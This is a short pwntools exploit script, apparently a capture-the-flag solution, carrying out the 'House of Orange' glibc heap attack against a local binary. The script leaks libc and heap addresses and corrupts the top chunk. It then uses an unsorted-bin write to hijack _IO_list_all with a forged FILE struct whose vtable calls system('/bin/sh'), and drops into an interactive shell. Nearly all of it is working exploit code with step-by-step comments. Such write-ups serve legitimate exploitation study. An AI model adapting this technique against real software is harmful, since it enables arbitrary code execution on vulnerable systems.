from pwn import *
r = process("./house_of_orange")
libc = ELF("./libc.so.6")


r.recvuntil(b"@ ")
libc.address = int(r.recv(14).strip().ljust(8,b"\x00"),16) - 0x675a0

r.recvuntil(b"@ ")
heap_base = int(r.recv(14).strip().ljust(8,b"\x00"),16)

# Phase 1: Put the top chunk in the unsorted bin
r.sendlineafter(b">",b"1")
r.sendlineafter(b">",b"3")
r.sendlineafter(b"data:",b"A" * 16 + p64(0) + p64(0x0fe1))
r.sendlineafter(b">",b"2")

# Phase 2: Modify the size of the top chunk to make it fit in smallbin[4]
#          Modify the top chunk bk pointer in unsorted bin to overwrite _IO_list_all with a main_arena relative address
#          Craft a fake FILE struct 

# 0x20: _IO_write_base = 2
# 0x28: _IO_write_ptr = 3
# 0x68: fake vtable
# 0xc0: _mode = 0
# 0xd8: vtable = top_chunk_address + 0x68

r.sendlineafter(b">",b"3")
payload = flat({
    0x0: [b"/bin/sh\x00", p64(0x61),
          p64(0), p64(libc.symbols['_IO_list_all'] - 0x10),
          p64(2), p64(3)],                                          
    0x68: [p64(0) * 3, p64(libc.symbols['system'])],      
    0xc0: [p64(0)],                             
    0xd8: [p64(heap_base + 0x20 + 0x68)],
    },filler="b\x00")
r.sendlineafter(b"data:", b"A" * 16 + payload)

# Phase 3: Trigger abort()
r.sendlineafter(b">",b"1")
r.interactive()
